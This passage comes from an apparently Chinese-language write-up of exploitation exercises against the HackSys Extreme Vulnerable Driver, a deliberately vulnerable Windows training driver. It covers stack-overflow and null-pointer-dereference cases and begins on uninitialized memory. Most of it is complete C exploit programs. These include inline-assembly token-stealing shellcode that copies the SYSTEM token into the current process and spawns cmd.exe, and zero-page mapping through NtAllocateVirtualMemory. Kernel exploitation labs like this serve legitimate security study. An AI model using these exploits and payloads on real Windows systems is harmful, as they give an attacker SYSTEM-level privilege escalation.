FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, <span class="literal">NULL</span>);</span><br><span class="line">	*(PDWORD)(buffer + <span class="number">0x900</span> - <span class="number">4</span>) = <span class="number">0xBAD0B0B0</span>;</span><br><span class="line">	DWORD dwret;</span><br><span class="line">	DeviceIoControl(hDevice, <span class="number">0x222027</span>, buffer, <span class="number">0xffffffff</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;dwret, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; r</span><br><span class="line">eax=00000000 ebx=86b45cf0 ecx=e32b7a0a edx=0000004d esi=83eff17c edi=86b45c80</span><br><span class="line">eip=35724334 esp=9a8d3ac0 ebp=72433372 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246</span><br><span class="line">35724334 ??              ???</span><br></pre></td></tr></table></figure>

<p><code>35724334</code>偏移为0x824</p>
<h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line">VOID <span class="title function_">TokenStealingPayloadWin7</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Importance of Kernel Recovery</span></span><br><span class="line">	__asm &#123;</span><br><span class="line">		pushad</span><br><span class="line">		xor eax, eax; eax设置为<span class="number">0</span></span><br><span class="line">		mov eax, fs: [eax + <span class="number">124</span>h]</span><br><span class="line">		mov eax, [eax + <span class="number">050</span>h]</span><br><span class="line">		mov ecx, eax</span><br><span class="line">		mov edx, <span class="number">4</span></span><br><span class="line">		SearchSystemPID :</span><br><span class="line">						mov eax, [eax + <span class="number">0b</span>8h]</span><br><span class="line">						sub eax, <span class="number">0b</span>8h</span><br><span class="line">						cmp[eax + <span class="number">0b</span>4h], edx</span><br><span class="line">						jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">						mov edx, [eax + <span class="number">0f</span>8h]</span><br><span class="line">						mov[ecx + <span class="number">0f</span>8h], edx</span><br><span class="line">						popad</span><br><span class="line">						xor eax, eax</span><br><span class="line">						add esp, <span class="number">12</span></span><br><span class="line">						pop ebp</span><br><span class="line">						ret <span class="number">8</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">VOID <span class="title function_">CreateCmd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	STARTUPINFO si = &#123; <span class="keyword">sizeof</span>(si) &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">	si.wShowWindow = SW_SHOW;</span><br><span class="line">	WCHAR wzFilePath[MAX_PATH] = &#123; <span class="string">L&quot;cmd.exe&quot;</span> &#125;;</span><br><span class="line">	BOOL bReturn = CreateProcessW(<span class="literal">NULL</span>, wzFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOW)&amp;si, &amp;pi);</span><br><span class="line">	<span class="keyword">if</span> (bReturn)</span><br><span class="line">		CloseHandle(pi.hThread), CloseHandle(pi.hProcess);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">0x82C</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	DWORD dwret = <span class="number">0</span>;</span><br><span class="line">	HANDLE hDevice = CreateFileA(<span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">memset</span>(buffer, <span class="string">&#x27;A&#x27;</span>, <span class="number">0x824</span>);</span><br><span class="line">	*(PDWORD)(buffer + <span class="number">0x824</span>) = (DWORD)TokenStealingPayloadWin7;</span><br><span class="line">	*(PDWORD)(buffer + <span class="number">0x828</span>) = <span class="number">0xBAD0B0B0</span>;</span><br><span class="line">	DeviceIoControl(hDevice, <span class="number">0x222027</span>, buffer, <span class="number">0xffffffff</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;dwret, <span class="literal">NULL</span>);</span><br><span class="line">	CreateCmd();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="9-NullPointerDereference"><a href="#9-NullPointerDereference" class="headerlink" title="9.NullPointerDereference"></a>9.NullPointerDereference</h1><p>原理：空指针<code>Null Pointer</code>指向0地址空间，如果不加判断就对其进行引用，会造成不可预知的后果。可以在0地址写入<code>shellcode</code>，通过调用空指针执行。</p>
<h2 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>释放之后依然对<code>v[1]</code>进行调用，此时其实是对<code>0x00000004</code>地址进行调用，利用方法就是，在<code>0x00000004</code>地址处写入<code>shellcode</code>的地址，然后通过IO控制码<code>0x22202b</code>与<code>HEVD</code>驱动通信，随便传入不为0的用户缓冲区即可：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">TriggerNullPointerDereference</span><span class="params">(<span class="type">void</span> *UserBuffer)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> **v1; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">void</span> (*v4)(ULONG, ULONG, PCSTR, ...); <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  ProbeForRead(UserBuffer, <span class="number">8u</span>, <span class="number">1u</span>);</span><br><span class="line">  v1 = ExAllocatePoolWithTag(NonPagedPool, <span class="number">8u</span>, <span class="number">0x6B636148</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="string">&quot;&#x27;kcaH&#x27;&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Type: %s\n&quot;</span>, <span class="string">&quot;NonPagedPool&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Size: 0x%X\n&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, v1);</span><br><span class="line">    v3 = *UserBuffer;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserValue: 0x%p\n&quot;</span>, *UserBuffer);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] NullPointerDereference: 0x%p\n&quot;</span>, v1);</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">0xBAD0B0B0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *v1 = <span class="number">0xBAD0B0B0</span>;</span><br><span class="line">      v1[<span class="number">1</span>] = NullPointerDereferenceObjectCallback;</span><br><span class="line">      v4 = _DbgPrintEx;</span><br><span class="line">      _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] NullPointerDereference-&gt;Value: 0x%p\n&quot;</span>, *v1);</span><br><span class="line">      _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] NullPointerDereference-&gt;Callback: 0x%p\n&quot;</span>, v1[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = _DbgPrintEx;</span><br><span class="line">      _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Freeing NullPointerDereference Object\n&quot;</span>);</span><br><span class="line">      _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="string">&quot;&#x27;kcaH&#x27;&quot;</span>);</span><br><span class="line">      _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, v1);</span><br><span class="line">      ExFreePoolWithTag(v1, <span class="number">0x6B636148</span>u);</span><br><span class="line">      v1 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v4(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Null Pointer Dereference\n&quot;</span>);</span><br><span class="line">    (v1[<span class="number">1</span>])();</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[-] Unable to allocate Pool chunk\n&quot;</span>);</span><br><span class="line">    result = <span class="number">-1073741801</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><code>VirtualAlloc</code>不允许在零页上申请内存空间的，所以需要使用到<code>NtAllocateVirtualMemory</code>来申请内存空间</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSYSCALLAPI NTSTATUS <span class="title function_">NtAllocateVirtualMemory</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]      HANDLE    ProcessHandle,</span></span><br><span class="line"><span class="params">  [in, out] PVOID     *BaseAddress,</span></span><br><span class="line"><span class="params">  [in]      ULONG_PTR ZeroBits,</span></span><br><span class="line"><span class="params">  [in, out] PSIZE_T   RegionSize,</span></span><br><span class="line"><span class="params">  [in]      ULONG     AllocationType,</span></span><br><span class="line"><span class="params">  [in]      ULONG     Protect</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>BaseAddress：指向变量的指针，该变量将接收已分配页面区域的基地址。如果BaseAddress的初始值非NULL，则从指定的虚拟地址开始分配区域，向下舍入到下一个主机页面大小地址边界。如果BaseAddress的初始值为NULL ，操作系统将决定在哪里分配该区域。</p>
</blockquote>
<p>当参数2设置为1时，将会自动向下取整整个页面大小，写入0时则由系统来给你定，这里是0页，所以要自己定位置</p>
<h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(WINAPI *My_NtAllocateVirtualMemory)</span><span class="params">(</span></span><br><span class="line"><span class="params">    IN HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">    IN OUT PVOID *BaseAddress,</span></span><br><span class="line"><span class="params">    IN ULONG ZeroBits,</span></span><br><span class="line"><span class="params">    IN OUT PULONG RegionSize,</span></span><br><span class="line"><span class="params">    IN ULONG AllocationType,</span></span><br><span class="line"><span class="params">    IN ULONG Protect)</span>;</span><br><span class="line"></span><br><span class="line">My_NtAllocateVirtualMemory NtAllocateVirtualMemory = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> VOID <span class="title function_">TokenStealingPayloadWin7</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Importance of Kernel Recovery</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">		pushad</span><br><span class="line">		xor eax, eax; eax设置为<span class="number">0</span></span><br><span class="line">		mov eax, fs: [eax + <span class="number">124</span>h]</span><br><span class="line">		mov eax, [eax + <span class="number">050</span>h]</span><br><span class="line">		mov ecx, eax</span><br><span class="line">		mov edx, <span class="number">4</span></span><br><span class="line">		SearchSystemPID :</span><br><span class="line">						mov eax, [eax + <span class="number">0b</span>8h]</span><br><span class="line">						sub eax, <span class="number">0b</span>8h</span><br><span class="line">						cmp[eax + <span class="number">0b</span>4h], edx</span><br><span class="line">						jne SearchSystemPID</span><br><span class="line"></span><br><span class="line">						mov edx, [eax + <span class="number">0f</span>8h]</span><br><span class="line">						mov[ecx + <span class="number">0f</span>8h], edx</span><br><span class="line">						popad</span><br><span class="line">						xor eax, eax</span><br><span class="line">						add esp, <span class="number">12</span></span><br><span class="line">						pop ebp</span><br><span class="line">						ret <span class="number">8</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">CreateCmd</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    STARTUPINFO si = &#123;<span class="keyword">sizeof</span>(si)&#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">    si.wShowWindow = SW_SHOW;</span><br><span class="line">    WCHAR wzFilePath[MAX_PATH] = &#123;<span class="string">L&quot;cmd.exe&quot;</span>&#125;;</span><br><span class="line">    BOOL bReturn = CreateProcessW(<span class="literal">NULL</span>, wzFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOW)&amp;si, &amp;pi);</span><br><span class="line">    <span class="keyword">if</span> (bReturn)</span><br><span class="line">        CloseHandle(pi.hThread), CloseHandle(pi.hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    DWORD dwret = <span class="number">0</span>;</span><br><span class="line">    HANDLE hDevice = CreateFileA(<span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    *(PDWORD32)(buffer) = <span class="number">0xBAD0B0B0</span> + <span class="number">1</span>;</span><br><span class="line">    PVOID Zero_addr = (PVOID)<span class="number">1</span>;</span><br><span class="line">    SIZE_T RegionSize = <span class="number">0x1000</span>;</span><br><span class="line">    *(FARPROC *)&amp;NtAllocateVirtualMemory = GetProcAddress(GetModuleHandleW(<span class="string">L&quot;ntdll&quot;</span>), <span class="string">&quot;NtAllocateVirtualMemory&quot;</span>);</span><br><span class="line">    NtAllocateVirtualMemory(INVALID_HANDLE_VALUE, &amp;Zero_addr, <span class="number">0</span>, &amp;RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    *(DWORD *)(<span class="number">0x4</span>) = (DWORD)&amp;TokenStealingPayloadWin7;</span><br><span class="line">    DeviceIoControl(hDevice, <span class="number">0x22202B</span>, buffer, <span class="number">4</span>, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;dwret, <span class="literal">NULL</span>);</span><br><span class="line">    CreateCmd();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="10-TriggerUninitializedMemoryStack-EXP存在问题"><a href="#10-TriggerUninitializedMemoryStack-EXP存在问题" class="headerlink" title="10.TriggerUninitializedMemoryStack(EXP存在问题)"></a>10.TriggerUninitializedMemoryStack(EXP存在问题)</h1><p>未初始化栈变量，本部分使用新的利用手法：栈喷射</p>
<h2 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先设置了个未初始化的变量<code>UninitializedMemory</code>，之后判断<code>UserBuffer</code>值，如果等于<code>0xBAD0B0B0</code>就设置<code>UninitializedMemory</code>的一些值，最后判断是否有回调函数，然后调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">TriggerUninitializedMemoryStack</span><span class="params">(<span class="type">void</span> *UserBuffer)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  _UNINITIALIZED_MEMORY_STACK UninitializedMemory; <span class="comment">// [esp+14h] [ebp-10Ch] BYREF</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+108h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  ProbeForRead(UserBuffer, <span class="number">0xF0</span>u, <span class="number">1u</span>);</span><br><span class="line">  v1 = *UserBuffer;</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserValue: 0x%p\n&quot;</span>, *UserBuffer);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UninitializedMemory Address: 0x%p\n&quot;</span>, &amp;UninitializedMemory);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">0xBAD0B0B0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    UninitializedMemory.Value = <span class="number">0xBAD0B0B0</span>;</span><br><span class="line">    UninitializedMemory.Callback = UninitializedMemoryStackObjectCallback;</span><br><span class="line">  &#125;</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UninitializedMemory.Value: 0x%p\n&quot;</span>, UninitializedMemory.Value);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UninitializedMemory.Callback: 0x%p\n&quot;</span>, UninitializedMemory.Callback);</span><br><span class="line">  _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Uninitialized Memory in Stack\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( UninitializedMemory.Callback )</span><br><span class="line">    UninitializedMemory.Callback();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于<code>_UNINITIALIZED_MEMORY_STACK</code>没有初始化，所以存在利用“<strong>栈喷射</strong>”将<code>_UNINITIALIZED_MEMORY_STACK</code>结构体成员<code>Callback</code>设置为<code>shellcode</code>函数的地址</p>
<p>栈喷射：</p>
<p>Windows内核API中存在一个函数<code>NtMapUserPhysicalPages</code>，可以拷贝输入的字节到内核栈上的一个本地缓冲区。（栈喷射：<a target="_blank" rel="noopener" href="https://j00ru.vexillium.org/2011/05/windows-kernel-stack-spraying-techniques/">nt!NtMapUserPhysicalPages 和内核堆栈喷射技术</a>）</p>
<h2 id="EXP-未完成"><a href="#EXP-未完成" class="headerlink" title="EXP(未完成)"></a>EXP(未完成)</h2><p>还是有点小问题，，</p>
<h1 id="11-TriggerUninitializedMemoryPagedPool"><a href="#11-TriggerUninitializedMemoryPagedPool" class="headerlink" title="11.TriggerUninitializedMemoryPagedPool"></a>11.TriggerUninitializedMemoryPagedPool</h1><p>未初始化池变量</p>
<h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>Windows 下，<code>Lookaside List(后备列表)</code>提供了一个比较简单的提高小块内存分配和申请效率的机制，用来进行固定大小内存块的小内存块的动态申请和释放</p>
<p>KPCRB中有这么几个：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KPRCB</span><br><span class="line">ntdll!_KPRCB</span><br><span class="line">...</span><br><span class="line">   +0x5a0 PPLookasideList  : [16] _PP_LOOKASIDE_LIST</span><br><span class="line">   +0x620 PPNPagedLookasideList : [32] _GENERAL_LOOKASIDE_POOL</span><br><span class="line">   +0xf20 PPPagedLookasideList : [32] _GENERAL_LOOKASIDE_POOL</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>每一个 <code>GENERAL_LOOKASIDE</code> 都是一条 <code>Lookaside List</code>，所有的 <code>GENERAL_LOOKASIDE</code> 用双向链表串起来，</p>
<p><code>Lookaside List</code>就是一个控制结构头和一个由相同大小的内存块构成的单链表组成，控制结构中，记录着当前后备列表的深度和最大深度</p>
<blockquote>
<p>在通过<code>ExAllocateFrom(N)PagedLookasideList</code>申请内存的时候，如果单链表不为空，那么就从头部摘出一块返回，否则使用<code>ExAllocatePoolWithTag</code>或者在初始化后备列表时提供的分配函数申请一个内存块返回给用户；在通过<code>ExFreeTo(N)PagedLookasideList</code>释放之前申请的内存块时，如果后备列表当前的深度没有超过最大深度，那么插入到内存块头部，否则使用<code>ExFreePoolWithTag</code>或在初始化后备列表时提供的释放函数释放内存块。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x48 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">GENERAL_LOOKASIDE_POOL</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> _<span class="title">SLIST_HEADER</span> <span class="title">ListHead</span>;</span>                                       <span class="comment">//0x0//内存链表</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">SINGLE_LIST_ENTRY</span> <span class="title">SingleListHead</span>;</span>                           <span class="comment">//0x0//是一条具有相同大小的空闲换页池单向链表</span></span><br><span class="line">    &#125;;</span><br><span class="line">    USHORT Depth;                                                           <span class="comment">//0x8//当前内存列表的最大深度</span></span><br><span class="line">    USHORT MaximumDepth;                                                    <span class="comment">//0xa//整个look aside运行的最大深度，默认256</span></span><br><span class="line">    ULONG TotalAllocates;                                                   <span class="comment">//0xc/总共分配了多少次内存</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG AllocateMisses;                                               <span class="comment">//0x10//分配失败的内存，通过Allocate分配</span></span><br><span class="line">        ULONG AllocateHits;                                                 <span class="comment">//0x10</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG TotalFrees;                                                       <span class="comment">//0x14</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG FreeMisses;                                                   <span class="comment">//0x18</span></span><br><span class="line">        ULONG FreeHits;                                                     